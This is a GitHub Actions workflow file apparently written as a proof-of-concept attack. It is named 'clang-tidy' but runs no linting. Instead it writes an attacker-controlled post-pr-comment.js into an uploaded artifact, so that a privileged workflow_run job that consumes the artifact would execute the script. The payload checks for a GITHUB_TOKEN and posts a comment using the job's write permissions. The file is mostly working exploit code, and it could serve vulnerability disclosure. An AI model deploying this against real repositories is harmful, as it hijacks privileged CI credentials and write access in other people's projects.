name: clang-tidy
on:
  push:
  pull_request:

permissions: {}

jobs:
  clang-tidy:
    if: github.repository_owner == 'echowhoami'
    runs-on: ubuntu-latest
    steps:
      - name: Build poisoned artifact
        run: |
          mkdir -p .github/scripts
          cat > .github/scripts/post-pr-comment.js <<'PAYLOAD'
          module.exports = async function ({ github, context, core, prNumber, body, marker }) {
            core.warning('PWNED: attacker-controlled post-pr-comment.js executed in the privileged workflow_run job');
            const proof = {
              repo: `${context.repo.owner}/${context.repo.repo}`,
              runId: process.env.GITHUB_RUN_ID,
              hasGithubToken: !!process.env.GITHUB_TOKEN,
              prNumber,
            };
            core.warning('PWNED_PROOF ' + JSON.stringify(proof));
            try {
              await github.rest.issues.createComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                issue_number: prNumber,
                body: 'PWNED: this comment was posted by attacker code injected via the clang-tidy-result artifact (PoC).',
              });
              core.warning('PWNED: posted comment as github-actions[bot] using the pull-requests:write token');
            } catch (e) {
              core.warning('PWNED: code ran but comment call failed: ' + e.message);
            }
          };
          PAYLOAD
          echo "poc results" > clang-tidy-comment.md
          echo "${{ github.event.pull_request.number }}" > pr_number.txt
      - name: Upload poisoned artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: clang-tidy-result
          path: |
            .github/scripts/post-pr-comment.js
            clang-tidy-comment.md
            pr_number.txt
          if-no-files-found: ignore
